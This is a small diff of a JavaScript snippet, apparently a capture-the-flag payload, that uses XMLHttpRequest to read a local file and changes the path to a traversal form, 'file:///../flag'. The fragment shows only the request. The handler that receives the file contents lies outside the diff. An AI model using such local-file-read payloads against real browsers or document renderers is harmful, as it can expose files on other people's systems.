@@ -6,5 +6,5 @@ function reqListener () {
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "file:///flag"); 
+oReq.open("GET", "file:///../flag"); 
 oReq.send();
